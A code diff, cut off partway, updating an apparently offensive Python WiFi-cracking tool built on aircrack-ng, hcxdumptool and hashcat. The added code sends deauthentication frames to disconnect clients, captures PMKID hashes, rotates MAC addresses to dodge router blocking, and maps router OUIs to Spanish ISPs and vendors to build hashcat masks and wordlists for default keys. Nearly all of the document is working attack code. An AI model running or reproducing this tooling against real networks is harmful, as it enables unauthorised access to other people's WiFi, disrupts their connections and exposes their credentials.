@@ -8,7 +8,7 @@ Requires: aircrack-ng suite, root.
 
 from __future__ import annotations
 
-__version__ = "1.0"
+__version__ = "1.1"
 
 BANNER = r"""
  __          ___  __ _        _____             _       _               
@@ -27,6 +27,7 @@ import hashlib
 import itertools
 import logging
 import os
+import random
 import re
 import signal
 import sqlite3
@@ -139,17 +140,99 @@ def run_cmd(cmd: list[str], timeout: Optional[int] = None, capture: bool = True)
         return (-1, "", "Command not found")
 
 
+# Retry classification for robust subprocess wrapper
+class _CmdOutcome:
+    TIMEOUT = "timeout"
+    NOT_FOUND = "not_found"
+    NON_ZERO = "non_zero"
+    SUCCESS = "success"
+
+
+def run_cmd_retry(
+    cmd: list[str],
+    timeout: Optional[int] = None,
+    capture: bool = True,
+    max_retries: int = 3,
+    backoff_base: float = 2.0,
+) -> tuple[int, str, str]:
+    """
+    Run command with retries and exponential backoff. Returns (returncode, stdout, stderr).
+    Retries on timeout or non-zero exit; does not retry on FileNotFoundError.
+    """
+    last_code, last_out, last_err = -1, "", ""
+    for attempt in range(max_retries):
+        last_code, last_out, last_err = run_cmd(cmd, timeout=timeout, capture=capture)
+        if last_code == 0:
+            return (last_code, last_out, last_err)
+        if last_code == -1 and "Command not found" in last_err:
+            return (last_code, last_out, last_err)
+        if attempt < max_retries - 1:
+            delay = backoff_base ** attempt
+            logging.debug("Command failed (attempt %d/%d), retrying in %.1fs: %s", attempt + 1, max_retries, delay, cmd)
+            time.sleep(delay)
+    return (last_code, last_out, last_err)
+
+
 def set_managed_mode(mon_iface: str) -> bool:
     """Put the interface back in managed mode (e.g. after Ctrl+C). Returns True on success."""
     if not mon_iface:
         return False
     logging.info("Putting interface %s back to managed mode...", mon_iface)
-    code, out, err = run_cmd(["airmon-ng", "stop", mon_iface], timeout=15)
+    code, out, err = run_cmd_retry(["airmon-ng", "stop", mon_iface], timeout=15, max_retries=2)
     if code == 0:
         logging.info("Interface set to managed mode.")
         return True
     logging.warning("airmon-ng stop failed: %s %s", out or "", err or "")
     return False
+
+
+def rotate_mac(iface: str) -> bool:
+    """
+    Set a random locally-administered MAC on the interface to reduce router blocking.
+    Uses macchanger -r if available, else ip link set address with 02:xx:xx:xx:xx:xx.
+    """
+    if not iface:
+        return False
+    code, out, err = run_cmd(["macchanger", "-r", iface], timeout=10)
+    if code == 0:
+        logging.info("MAC rotated on %s", iface)
+        return True
+    # Fallback: random MAC 02:xx:xx:xx:xx:xx (unicast, locally administered)
+    mac = "02:" + ":".join(f"{random.randint(0, 255):02x}" for _ in range(5))
+    code2, _, _ = run_cmd(["ip", "link", "set", "dev", iface, "address", mac], timeout=5)
+    if code2 == 0:
+        logging.info("MAC set to %s on %s (ip link)", mac, iface)
+        return True
+    logging.debug("MAC rotation failed for %s: macchanger and ip link set failed", iface)
+    return False
+
+
+def _check_injection(mon_iface: str) -> bool:
+    """Run aireplay-ng --test to verify driver supports packet injection. Returns True if injection works."""
+    code, out, err = run_cmd(["aireplay-ng", "--test", mon_iface], timeout=15)
+    combined = (out or "") + " " + (err or "")
+    if code == 0 and ("Injection is working" in combined or "Reply" in combined):
+        logging.info("Injection test passed for %s", mon_iface)
+        return True
+    logging.warning("Injection test failed or inconclusive for %s (driver may not support injection)", mon_iface)
+    return False
+
+
+def _get_interface_channel(iface: str) -> Optional[int]:
+    """Get current channel of interface via iw dev <iface> info. Returns None if not available."""
+    code, out, err = run_cmd(["iw", "dev", iface, "info"], timeout=5)
+    if code != 0:
+        return None
+    m = re.search(r"channel\s+(\d+)", (out or "") + (err or ""), re.IGNORECASE)
+    return int(m.group(1)) if m else None
+
+
+def _set_interface_channel(iface: str, channel: int) -> bool:
+    """Set interface channel with iw. Returns True if set and verified."""
+    code, _, _ = run_cmd(["iw", "dev", iface, "set", "channel", str(channel)], timeout=5)
+    if code != 0:
+        return False
+    return _get_interface_channel(iface) == channel
 
 
 def ensure_monitor_mode(device: str) -> Optional[str]:
@@ -159,14 +242,18 @@ def ensure_monitor_mode(device: str) -> Optional[str]:
     with fallback to dev + "mon".
     """
     dev = device.strip()
-    # Check if already monitor
-    code, out, err = run_cmd(["iwconfig", dev], timeout=5)
-    if code == 0 and "Mode:Monitor" in out:
+    # Check if already monitor (prefer iw, fallback to iwconfig)
+    code, out, err = run_cmd(["iw", "dev", dev, "info"], timeout=5)
+    if code == 0 and out and "type monitor" in (out + (err or "")).lower():
         logging.info("Interface %s is already in monitor mode", dev)
         return dev
-    # Start monitor with airmon-ng
+    code2, out2, _ = run_cmd(["iwconfig", dev], timeout=5)
+    if code2 == 0 and "Mode:Monitor" in (out2 or ""):
+        logging.info("Interface %s is already in monitor mode", dev)
+        return dev
+    # Start monitor with airmon-ng (retry on transient failures)
     logging.info("Putting interface %s into monitor mode...", dev)
-    code, out, err = run_cmd(["airmon-ng", "start", dev], timeout=15)
+    code, out, err = run_cmd_retry(["airmon-ng", "start", dev], timeout=15, max_retries=2)
     if code != 0:
         logging.error("airmon-ng start failed: %s %s", out, err)
         return None
@@ -195,6 +282,7 @@ def ensure_monitor_mode(device: str) -> Optional[str]:
             logging.info("Using interface %s as monitor (parsed name not found)", dev)
             return dev
     logging.info("Monitor interface: %s", mon)
+    _check_injection(mon)
     return mon
 
 
@@ -239,6 +327,11 @@ def parse_airodump_csv(csv_path: Path) -> tuple[list[dict], list[dict]]:
                             ap["channel"] = int(ch) if ch.isdigit() else 0
                         except (ValueError, TypeError):
                             ap["channel"] = 0
+                        try:
+                            pwr = (ap.get("Power") or ap.get(" PWR ") or "").strip()
+                            ap["rssi"] = int(pwr) if pwr.lstrip("-").isdigit() else -999
+                        except (ValueError, TypeError):
+                            ap["rssi"] = -999
                         essid_val = (ap.get("ESSID") or "").strip()
                         if not essid_val:
                             essid_val = "hidden_network"
@@ -335,15 +428,19 @@ def get_networks_with_clients(
         if essid in skip_essids:
             continue
         clients = bssid_to_clients.get(bssid, [])
-        if not clients:
+        # Include APs with clients; also include hidden APs with no clients (for PMKID capture)
+        if not clients and essid != "hidden_network":
             continue
         result.append({
             "bssid": bssid,
             "channel": ap.get("channel", 0) or 0,
             "essid": essid,
             "clients": list(dict.fromkeys(clients)),
+            "rssi": ap.get("rssi", -999),
         })
 
+    # Prioritize hidden APs first, then by RSSI descending (stronger signal first)
+    result.sort(key=lambda n: (0 if (n.get("essid") or "") == "hidden_network" else 1, -(n.get("rssi") or -999)))
     logging.info("Found %d networks with clients (after skipping %d done)", len(result), len(skip_bssids))
     return result
 
@@ -356,12 +453,11 @@ def reveal_hidden_essid(
     scan_dir: Path,
     current_proc_holder: Optional[list] = None,
     timeout_sec: int = 25,
+    passive_secs: int = 10,
 ) -> Optional[str]:
     """
-    Try to reveal the ESSID of a hidden network by running airodump focused on the BSSID,
-    sending deauths so clients reconnect (Association Request contains SSID), then parsing
-    the CSV. Returns the revealed ESSID or None. Only trusts the ESSID from the AP row
-    for this BSSID to avoid false positives.
+    Reveal hidden ESSID: mandatory passive sniff first, then minimal deauth only if clients
+    are present; stop immediately on first association frame (ESSID in CSV).
     """
     scan_dir.mkdir(parents=True, exist_ok=True)
     prefix = scan_dir / f"reveal_{bssid.replace(':', '')}"
@@ -374,7 +470,21 @@ def reveal_hidden_essid(
         "-a",
         mon_iface,
     ]
-    logging.info("Attempting ESSID recovery for hidden BSSID %s (timeout %ds)", bssid, timeout_sec)
+    def _check_revealed() -> Optional[str]:
+        csv_files = list(scan_dir.glob(f"reveal_{bssid.replace(':', '')}-*.csv"))
+        if not csv_files:
+            return None
+        latest = max(csv_files, key=lambda p: p.stat().st_mtime)
+        aps, _ = parse_airodump_csv(latest)
+        for ap in aps:
+            if (ap.get("BSSID") or "").strip().lower() == bssid.lower():
+                essid = (ap.get("ESSID") or "").strip()
+                if essid and essid != "hidden_network" and len(essid) <= 32:
+                    return essid
+                break
+        return None
+
+    logging.info("Hidden ESSID recovery for %s: passive %ds then minimal deauth (timeout %ds)", bssid, passive_secs, timeout_sec)
     start = time.time()
     proc = subprocess.Popen(
         cmd,
@@ -385,22 +495,38 @@ def reveal_hidden_essid(
     if current_proc_holder is not None:
         current_proc_holder[0] = proc
     try:
-        time.sleep(5)
-        for _ in range(2):
-            if (time.time() - start) >= timeout_sec:
-                break
-            for client in client_macs[:2]:
-                run_cmd([
-                    "aireplay-ng",
-                    "-0", "2",
-                    "-a", bssid,
-                    "-c", client,
-                    "--ignore-negative-one",
-                    mon_iface,
-                ], timeout=10)
-            time.sleep(5)
-        remaining = max(2, timeout_sec - int(time.time() - start))
-        time.sleep(min(5, remaining))
+        # Phase 1: mandatory passive sniff (no deauth) to confirm BSSID/clients
+        passive = min(passive_secs, max(5, timeout_sec // 3))
+        time.sleep(passive)
+        revealed = _check_revealed()
+        if revealed:
+            return revealed
+        # Phase 2: only if we have clients — minimal deauth (1–2 packets), stop on first association
+        if not client_macs:
+            logging.debug("No clients for %s; skipping deauth", bssid)
+            remaining = max(2, timeout_sec - int(time.time() - start))
+            time.sleep(min(5, remaining))
+        else:
+            max_rounds = 3
+            for round_num in range(max_rounds):
+                if (time.time() - start) >= timeout_sec:
+                    break
+                # Ultra selective: 1 deauth per client per round
+                for client in client_macs[:3]:
+                    run_cmd([
+                        "aireplay-ng",
+                        "-0", "1",
+                        "-a", bssid,
+                        "-c", client,
+                        "--ignore-negative-one",
+                        mon_iface,
+                    ], timeout=10)
+                time.sleep(3)
+                revealed = _check_revealed()
+                if revealed:
+                    return revealed
+            remaining = max(2, timeout_sec - int(time.time() - start))
+            time.sleep(min(3, remaining))
     finally:
         if current_proc_holder is not None:
             current_proc_holder[0] = None
@@ -423,6 +549,86 @@ def reveal_hidden_essid(
             if essid and essid != "hidden_network" and len(essid) <= 32:
                 return essid
             break
+    return None
+
+
+def try_capture_pmkid(
+    mon_iface: str,
+    bssid: str,
+    channel: int,
+    handshakes_dir: Path,
+    timeout_sec: int = 45,
+    current_proc_holder: Optional[list] = None,
+) -> Optional[Path]:
+    """
+    Attempt PMKID capture for a BSSID without requiring clients (hcxdumptool).
+    Returns path to .22000 file if captured and converted, else None.
+    """
+    if shutil.which("hcxdumptool") is None or shutil.which("hcxpcapngtool") is None:
+        logging.debug("hcxdumptool/hcxpcapngtool not available; skipping PMKID capture")
+        return None
+    handshakes_dir.mkdir(parents=True, exist_ok=True)
+    bssid_flat = bssid.replace(":", "").replace("-", "")
+    prefix = handshakes_dir / f"pmkid_{bssid_flat}"
+    pcapng_path = prefix.with_suffix(".pcapng")
+    filter_path = handshakes_dir / f"pmkid_filter_{bssid_flat}.txt"
+    try:
+        filter_path.write_text(bssid_flat + "\n", encoding="utf-8")
+    except OSError:
+        return None
+    cmd = [
+        "hcxdumptool",
+        "-i", mon_iface,
+        "-o", str(pcapng_path),
+        "--filterlist_ap", str(filter_path),
+        "--filtermode=2",
+        "-c", str(channel),
+        "--enable_status=1",
+    ]
+    logging.info("PMKID capture (no client): BSSID %s, channel %s, %ds", bssid, channel, timeout_sec)
+    proc = subprocess.Popen(
+        cmd,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.PIPE,
+        cwd=str(handshakes_dir),
+    )
+    if current_proc_holder is not None:
+        current_proc_holder[0] = proc
+    try:
+        time.sleep(timeout_sec)
+    finally:
+        if current_proc_holder is not None:
+            current_proc_holder[0] = None
+        proc.terminate()
+        try:
+            proc.wait(timeout=8)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait()
+    try:
+        filter_path.unlink(missing_ok=True)
+    except OSError:
+        pass
+    if not pcapng_path.exists() or pcapng_path.stat().st_size == 0:
+        if pcapng_path.exists():
+            try:
+                pcapng_path.unlink(missing_ok=True)
+            except OSError:
+                pass
+        return None
+    out_22000 = prefix.with_suffix(".22000")
+    code, _, _ = run_cmd(["hcxpcapngtool", "-o", str(out_22000), str(pcapng_path)], timeout=60)
+    try:
+        pcapng_path.unlink(missing_ok=True)
+    except OSError:
+        pass
+    if code == 0 and out_22000.exists() and out_22000.stat().st_size > 0:
+        return out_22000
+    if out_22000.exists():
+        try:
+            out_22000.unlink(missing_ok=True)
+        except OSError:
+            pass
     return None
 
 
@@ -472,6 +678,13 @@ def capture_handshake(
     """
     cap_path = Path(cap_path)
     cap_path.parent.mkdir(parents=True, exist_ok=True)
+    # Set and verify interface channel before capture (robust channel handling)
+    if not _set_interface_channel(mon_iface, channel):
+        logging.warning("Could not set %s to channel %s; capture may fail", mon_iface, channel)
+    else:
+        current_ch = _get_interface_channel(mon_iface)
+        if current_ch != channel:
+            logging.warning("Channel mismatch: expected %s, got %s on %s", channel, current_ch, mon_iface)
     cap_base = str(cap_path.with_suffix(""))
     cmd_capture = [
         "airodump-ng",
@@ -538,40 +751,149 @@ def capture_handshake(
     return False
 
 
-# Leet substitutions (common)
+# Leet: full map for compatibility; limited set for reduced noise (a→4, e→3, o→0 only)
 _LEET_MAP = {"a": "4", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7", "b": "8", "g": "9", "z": "2", "l": "1"}
+_LEET_LIMITED = {"a": "4", "e": "3", "o": "0"}
 
-# Case permutations only if len <= 10; otherwise only lower/upper/title (avoid combinatorial explosion)
-_MAX_FULL_CASE_LEN = 10
-# Leet expansion only if len <= 12; otherwise no leet variants
+# Case: only lower, Capitalized, UPPER (no full 2^n permutations)
+_MAX_FULL_CASE_LEN = 0
+# Leet expansion only if len <= 12
 _MAX_LEET_LEN = 12
-# Max leetable positions to generate full 2^k leet variants (when len <= _MAX_LEET_LEN)
 _MAX_LEET_POSITIONS = 14
 
 # Hashcat masks per ISP profile (?h=hex, ?d=digit, ?a=alnum). Attack -a 3 with GPU.
 # ?h20 and ?a10 only included with --aggressive-masks (infeasible in normal audits).
 _ISP_MASKS = {
     "MOVISTAR_OLD_HEX8": [{"mask": "?h" * 8, "priority": 1}],
-    "MOVISTAR_OLD_HEX20": [{"mask": "?h" * 20, "priority": 3}],   # only --aggressive-masks
+    "MOVISTAR_OLD_HEX20": [{"mask": "?h" * 20, "priority": 3}],
     "VODAFONE_NUM8": [{"mask": "?d" * 8, "priority": 1}],
-    "ORANGE_ALNUM10": [{"mask": "?a" * 10, "priority": 2}],        # only --aggressive-masks
+    "ORANGE_ALNUM10": [{"mask": "?a" * 10, "priority": 2}],
     "GENERIC_NUM9": [{"mask": "?d" * 9, "priority": 1}],
     "GENERIC_ALNUM8": [{"mask": "?a" * 8, "priority": 1}],
 }
 
+# OUI (first 3 bytes of BSSID) to ISP for contextual detection
+_OUI_TO_ISP: dict[str, str] = {
+    "00:19:C6": "MOVISTAR",
+    "00:1E:75": "MOVISTAR",
+    "00:25:68": "MOVISTAR",
+    "F4:F5:D8": "MOVISTAR",
+    "E4:50:EB": "VODAFONE",
+    "00:1E:7A": "VODAFONE",
+    "00:23:CD": "ORANGE",
+    "00:26:4A": "ORANGE",
+}
 
-def generate_isp_masks(essid: str, aggressive: bool = False) -> tuple[Optional[str], list[dict]]:
-    """
-    Returns (ISP_profile, list of {mask, priority}) based on ESSID.
-    By default does not include infeasible masks (?h20, ?a10); use aggressive=True or --aggressive-masks.
-    """
-    essid_upper = essid.upper().strip()
-    if not essid_upper:
-        return None, []
+# OUI to router vendor for historical pattern selection (model-specific masks)
+_OUI_TO_VENDOR: dict[str, str] = {
+    "00:19:C6": "ZTE",
+    "00:1E:75": "ZTE",
+    "00:25:68": "Huawei",
+    "F4:F5:D8": "MitraStar",
+    "E4:50:EB": "Huawei",
+    "00:1E:7A": "ZTE",
+    "00:23:CD": "Huawei",
+    "00:26:4A": "Sagemcom",
+}
 
+# Per-ISP per-vendor mask sets (historical patterns). "default" when vendor unknown.
+# Many current routers are not purely hex; include hybrid-style patterns.
+_ISP_MASKS_BY_VENDOR: dict[str, dict[str, list[dict]]] = {
+    "MOVISTAR": {
+        "default": [
+            {"mask": "?h" * 8, "priority": 1},
+            {"mask": "?h" * 4 + "?d" * 4, "priority": 1},
+            {"mask": "?d" * 8, "priority": 2},
+        ],
+        "ZTE": [
+            {"mask": "?h" * 8, "priority": 1},
+            {"mask": "?h" * 6 + "?d" * 2, "priority": 1},
+            {"mask": "?d" * 8, "priority": 2},
+        ],
+        "Huawei": [
+            {"mask": "?h" * 8, "priority": 1},
+            {"mask": "?h" * 4 + "?d" * 4, "priority": 1},
+        ],
+        "MitraStar": [
+            {"mask": "?h" * 8, "priority": 1},
+            {"mask": "?d" * 8, "priority": 1},
+        ],
+        "Sagemcom": [
+            {"mask": "?h" * 8, "priority": 1},
+            {"mask": "?d" * 8, "priority": 1},
+        ],
+    },
+    "VODAFONE": {
+        "default": [
+            {"mask": "?d" * 8, "priority": 1},
+            {"mask": "?d" * 6, "priority": 1},
+        ],
+        "ZTE": [{"mask": "?d" * 8, "priority": 1}, {"mask": "?h" * 4 + "?d" * 4, "priority": 2}],
+        "Huawei": [{"mask": "?d" * 8, "priority": 1}],
+    },
+    "ORANGE": {
+        "default": [
+            {"mask": "?d" * 8, "priority": 1},
+            {"mask": "?a" * 8, "priority": 2},
+        ],
+        "Huawei": [{"mask": "?d" * 8, "priority": 1}, {"mask": "?a" * 8, "priority": 2}],
+        "Sagemcom": [{"mask": "?d" * 8, "priority": 1}],
+    },
+}
+
+
+def _bssid_to_oui(bssid: str) -> str:
+    """Normalize BSSID to OUI string XX:XX:XX (first 3 bytes)."""
+    if not bssid:
+        return ""
+    parts = bssid.replace("-", ":").strip().split(":")[:3]
+    return ":".join(p.upper().zfill(2) for p in parts if len(p) <= 2)[:8]
+
+
+def _get_isp_hybrid_bases(essid: str, profile: str) -> list[str]:
+    """Base words for hashcat hybrid -a 6 (wordlist + mask). One word per line."""
+    essid_s = (essid or "").strip()
+    bases: list[str] = []
+    if essid_s:
+        bases.extend([essid_s, essid_s.lower(), essid_s.upper(), essid_s.title()])
+    if profile == "MOVISTAR":
+        bases.extend(["Movistar", "movistar", "MOVISTAR", "Movistar_"])
+    elif profile == "VODAFONE":
+        bases.extend(["Vodafone", "vodafone", "VODAFONE"])
+    elif profile == "ORANGE":
+        bases.extend(["Orange", "orange", "ORANGE"])
+    return list(dict.fromkeys(bases))
+
+
+def generate_isp_masks(
+    essid: str,
+    aggressive: bool = False,
+    bssid: Optional[str] = None,
+) -> tuple[Optional[str], list[dict], list[str]]:
+    """
+    Returns (ISP_profile, list of {mask, priority}, hybrid_base_words) from ESSID and/or BSSID OUI.
+    Uses vendor from OUI for model-specific historical patterns. hybrid_base_words for -a 6.
+    """
+    essid_upper = (essid or "").upper().strip()
+    oui = _bssid_to_oui(bssid or "")
+    profile_from_essid: Optional[str] = None
     if essid_upper.startswith("MOVISTAR"):
-        out: list[dict] = [{"mask": "?h" * 8, "priority": 1}]
-        # Derive mask from ESSID hex suffix (e.g. MOVISTAR_1A2B -> 1A2B + ?h^4)
+        profile_from_essid = "MOVISTAR"
+    elif essid_upper.startswith("VODAFONE"):
+        profile_from_essid = "VODAFONE"
+    elif essid_upper.startswith("ORANGE"):
+        profile_from_essid = "ORANGE"
+    profile_from_oui = _OUI_TO_ISP.get(oui) if oui else None
+    profile = profile_from_essid or profile_from_oui
+    if not profile:
+        return None, [], []
+
+    vendor = _OUI_TO_VENDOR.get(oui, "default") if oui else "default"
+    by_vendor = _ISP_MASKS_BY_VENDOR.get(profile, {})
+    out: list[dict] = list(by_vendor.get(vendor) or by_vendor.get("default") or [])
+
+    # ESSID-derived masks (e.g. MOVISTAR_1A2B -> 1A2B?h?h?h?h)
+    if profile == "MOVISTAR":
         m = re.search(r"_([0-9A-F]{4})$", essid_upper)
         if m:
             suffix = m.group(1)
@@ -579,18 +901,12 @@ def generate_isp_masks(essid: str, aggressive: bool = False) -> tuple[Optional[s
             out.append({"mask": "?h" * 4 + suffix, "priority": 1})
         if aggressive:
             out.append({"mask": "?h" * 20, "priority": 3})
-        return "MOVISTAR", out
 
-    if essid_upper.startswith("VODAFONE"):
-        return "VODAFONE", [
-            {"mask": "?d" * 8, "priority": 1},
-        ]
-    if essid_upper.startswith("ORANGE"):
-        if aggressive:
-            return "ORANGE", [{"mask": "?a" * 10, "priority": 2}]
-        return "ORANGE", []  # ?a10 infeasible by default
+    if profile == "ORANGE" and aggressive:
+        out.append({"mask": "?a" * 10, "priority": 3})
 
-    return None, []
+    hybrid_bases = _get_isp_hybrid_bases(essid or "", profile)
+    return profile, out, hybrid_bases
 
 
 def _mask_keyspace(mask: str) -> int:
@@ -606,54 +922,112 @@ def _estimate_mask_time_hours(keyspace: int, speed_hps: float = 300_000.0) -> fl
     return keyspace / speed_hps / 3600.0
 
 
-def write_hcmask(filename: str, masks: list[dict]) -> None:
-    """Write a .hcmask file for hashcat -a 3 (mask attack). Sorts by priority."""
+def get_hashcat_speed_22000() -> Optional[float]:
+    """
+    Run hashcat -b -m 22000 and parse reported speed. Returns H/s or None if unavailable.
+    Used to adjust mask time estimates and filtering dynamically.
+    """
+    if shutil.which("hashcat") is None:
+        return None
+    code, out, err = run_cmd(["hashcat", "-b", "-m", "22000"], timeout=120)
+    combined = (out or "") + "\n" + (err or "")
+    # Speed.#1.........: 250.0 kH/s or 1.5 MH/s
+    m = re.search(r"Speed\.#\d+[.\s]+:\s*([\d.]+)\s*([kMG])?H/s", combined, re.IGNORECASE)
+    if not m:
+        return None
+    try:
+        val = float(m.group(1))
+        unit = (m.group(2) or " ").upper()
+        mult = {" ": 1, "K": 1e3, "M": 1e6, "G": 1e9}
+        return val * mult.get(unit, 1)
+    except (ValueError, IndexError):
+        return None
+
+
+def write_hcmask(
+    filename: str,
+    masks: list[dict],
+    max_hours: float = 48.0,
+    speed_hps: float = 300_000.0,
+) -> tuple[int, int]:
+    """
+    Write .hcmask for hashcat -a 3. Skips masks with estimated time > max_hours.
+    Returns (written_count, skipped_count).
+    """
     Path(filename).parent.mkdir(parents=True, exist_ok=True)
     sorted_masks = sorted(masks, key=lambda x: x["priority"])
+    written: list[dict] = []
+    skipped = 0
+    for entry in sorted_masks:
+        mask = entry["mask"]
+        hours = _estimate_mask_time_hours(_mask_keyspace(mask), speed_hps)
+        if hours > max_hours:
+            logging.debug("Skip mask (est. %.1f h > %.0f h): %s", hours, max_hours, mask)
+            skipped += 1
+            continue
+        written.append(entry)
     with open(filename, "w", encoding="utf-8") as f:
-        for entry in sorted_masks:
+        for entry in written:
             f.write(entry["mask"] + "\n")
+    if skipped:
+        logging.info("Skipped %d mask(s) with estimated time > %.0f h", skipped, max_hours)
+    return len(written), skipped
 
 
 def _all_case_permutations(word: str) -> set[str]:
-    """All 2^n case variants (upper/lower per character). Capped for long words."""
+    """Only lower, Capitalized, UPPER (no full 2^n to reduce noise and improve effectiveness)."""
     low = word.lower()
-    n = len(low)
-    if n > _MAX_FULL_CASE_LEN:
-        return {word, low, word.upper(), word.title()}
-    out: set[str] = set()
-    for bits in itertools.product((0, 1), repeat=n):
-        s = "".join(low[i].upper() if bits[i] else low[i] for i in range(n))
-        out.add(s)
-    return out
+    return {low, low.upper(), low.title() if low else low}
 
 
 def _all_leet_variants(word: str) -> set[str]:
-    """All 2^k leet variants (substitute or not for each leetable char). Only if len <= 12."""
+    """Limited leet: only common variants a→4, e→3, o→0 (one substitution type per variant). No deep cross."""
     low = word.lower()
     if len(low) > _MAX_LEET_LEN:
         return {word}
-    # Positions that have a leet substitution
-    positions = [i for i in range(len(low)) if low[i] in _LEET_MAP]
-    if len(positions) > _MAX_LEET_POSITIONS:
-        return {word, "".join(_LEET_MAP.get(c, c) for c in low)}
-    out: set[str] = set()
-    for choices in itertools.product((0, 1), repeat=len(positions)):
-        s = list(word)
-        for j, pos in enumerate(positions):
-            if choices[j]:
-                s[pos] = _LEET_MAP[low[pos]]
-        out.add("".join(s))
+    out: set[str] = {word}
+    for char, sub in _LEET_LIMITED.items():
+        if char in low:
+            out.add("".join(sub if c == char else c for c in low))
     return out
 
 
 def _case_then_leet_bases(word: str) -> set[str]:
-    """All combinations: every case permutation, then every leet variant of that. E.g. Sarabi -> SaR4b1, s4r4b1, etc."""
+    """Case variants (lower/upper/title) then limited leet variants."""
     case_set = _all_case_permutations(word)
     bases: set[str] = set()
     for c in case_set:
         bases |= _all_leet_variants(c)
     return bases
+
+
+def _wordlist_score(word: str, current_year: int) -> int:
+    """
+    Heuristic score for wordlist ordering (lower = higher priority).
+    Prefer: recent years (2023 > 2019), 2-digit year over 4-digit, typical capitalization.
+    """
+    score = 0
+    # Historical frequency: more recent year = lower score (2024=0, 2023=1, 2019=5)
+    year_penalty = 10
+    for y in range(current_year + 1, 1999, -1):
+        if str(y) in word or (y >= 2000 and str(y)[2:] in word):
+            year_penalty = max(0, current_year - y)
+            break
+    score += year_penalty
+    # Prefer 2-digit year over full 4-digit when same year
+    s = str(current_year)
+    s2 = s[2:]
+    if s2 in word and s in word:
+        pass
+    elif s2 in word:
+        pass
+    elif s in word:
+        score += 1
+    if word.islower() or word.isupper() or (len(word) > 0 and word[0].isupper() and word[1:].islower()):
+        pass
+    else:
+        score += 1
+    return score
 
 
 def generate_wordlist_for_essid(essid: str, output_path: Path, max_words: Optional[int] = None) -> int:
@@ -677,7 +1051,7 @@ def generate_wordlist_for_essid(essid: str, output_path: Path, max_words: Option
         year_suffixes.append(str(y))
         year_suffixes.append(str(y)[2:])
     # Limit years to avoid explosion: 2000–current for full, last 15 years for short
-    years_full = [str(y) for y in range(2000, current_year + 1)]
+    years_full = [str(y) for y in range(current_year - 10, current_year + 1)]
     years_short = [str(y)[2:] for y in range(max(2000, current_year - 14), current_year + 1)]
     months = [f"{m:02d}" for m in range(1, 13)]
     suffixes = ["!", "!!", "@", "#", "123", "1234", "*", "?"]
@@ -732,7 +1106,8 @@ def generate_wordlist_for_essid(essid: str, output_path: Path, max_words: Option
                 add(w + sep + "123")
                 add(w + sep + "!")
 
-    lines = sorted(words)
+    # Sort by probability heuristics (current year first, typical cap, etc.) then alphabetically
+    lines = sorted(words, key=lambda w: (_wordlist_score(w, current_year), w))
     if max_words is not None and len(lines) > max_words:
         lines = lines[:max_words]
     output_path.parent.mkdir(parents=True, exist_ok=True)
@@ -770,23 +1145,20 @@ def init_db(db_path: Path) -> sqlite3.Connection:
 
 def check_dependencies() -> bool:
     """
-    Check for required external tools. Returns True if everything critical is
-    present, otherwise logs installation hints and returns False.
+    Validate required and optional external tools at startup.
+    Required: aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng, aircrack-ng), iw.
+    Optional: hcxtools (hcxpcapngtool), hashcat, iwconfig (fallback for iw).
     """
-    required = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
-    optional = ["hcxpcapngtool", "iwconfig"]
+    required = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "iw"]
+    optional = ["hcxpcapngtool", "hashcat", "iwconfig"]
 
-    missing_required = [cmd for cmd in required if shutil.which(cmd) is None]
-    missing_optional = [cmd for cmd in optional if shutil.which(cmd) is None]
+    missing_required = [c for c in required if shutil.which(c) is None]
+    missing_optional = [c for c in optional if shutil.which(c) is None]
 
     if missing_required:
+        logging.error("Missing required tools: %s", ", ".join(missing_required))
         logging.error(
-            "Missing required external tools: %s",
-            ", ".join(missing_required),
-        )
-        logging.error(
-            "Install them before continuing. On Debian/Kali-like systems you can run, for example: "
-            "sudo apt update && sudo apt install aircrack-ng"
+            "Install before continuing. Example: sudo apt update && sudo apt install aircrack-ng iw"
         )
         return False
 
@@ -795,12 +1167,10 @@ def check_dependencies() -> bool:
             "Optional tools not found: %s (some features may be limited)",
             ", ".join(missing_optional),
         )
-        logging.warning(
-            "It is recommended to install 'hcxtools' to get hcxpcapngtool "
-            "and generate 22000 hashes for hashcat."
-        )
+        if "hcxpcapngtool" in missing_optional:
+            logging.warning("Install hcxtools for .22000 hashcat format: sudo apt install hcxtools")
 
-    logging.debug("All critical external dependencies are available.")
+    logging.debug("Required dependencies OK.")
     return True
 
 
@@ -909,6 +1279,10 @@ def main() -> int:
                         help="Delay between APs to avoid driver issues.")
     parser.add_argument("--hidden-wait", type=int, default=25, metavar="SECONDS",
                         help="Max time (seconds) to spend trying to reveal a hidden ESSID before capture.")
+    parser.add_argument("--hidden-passive", type=int, default=10, metavar="SECONDS",
+                        help="Passive sniff time (no deauth) before attempting deauth for hidden ESSID.")
+    parser.add_argument("--mac-rotate", type=int, default=0, metavar="N",
+                        help="Rotate interface MAC every N cycles (0=disabled). Reduces router blocking.")
     args = parser.parse_args()
 
     base_path = (Path(args.path) if args.path else Path.cwd()).resolve()
@@ -923,11 +1297,18 @@ def main() -> int:
     if args.wordlist is not None:
         out_dir = (base_path / "wordlists").resolve() if args.wordlist == "" else Path(args.wordlist).resolve()
         out_dir.mkdir(parents=True, exist_ok=True)
+        speed_hps = get_hashcat_speed_22000()
+        if speed_hps is None:
+            speed_hps = 300_000.0
+            logging.debug("Using default 300 kH/s for mask estimates (hashcat benchmark not available)")
+        else:
+            logging.info("Hashcat WPA2 benchmark: %.1f kH/s (used for mask time estimates)", speed_hps / 1000.0)
         conn = init_db(db_path)
         seen: set[str] = set()
         total_words = 0
-        for row in conn.execute("SELECT essid FROM captured"):
+        for row in conn.execute("SELECT essid, bssid FROM captured"):
             essid = (row[0] or "").strip()
+            bssid = (row[1] or "").strip() if len(row) > 1 else ""
             if not essid or essid in seen:
                 continue
             seen.add(essid)
@@ -948,25 +1329,30 @@ def main() -> int:
                 "  Hashcat (wordlist): hashcat -m 22000 %s -a 0 %s -O -w 4 --status",
                 handshake_placeholder, out_file.resolve(),
             )
-            isp, masks = generate_isp_masks(essid, aggressive=args.aggressive_masks)
+            isp, masks, hybrid_bases = generate_isp_masks(essid, aggressive=args.aggressive_masks, bssid=bssid)
             if masks:
                 hcmask_path = out_dir / f"{safe_name}_isp.hcmask"
-                write_hcmask(str(hcmask_path), masks)
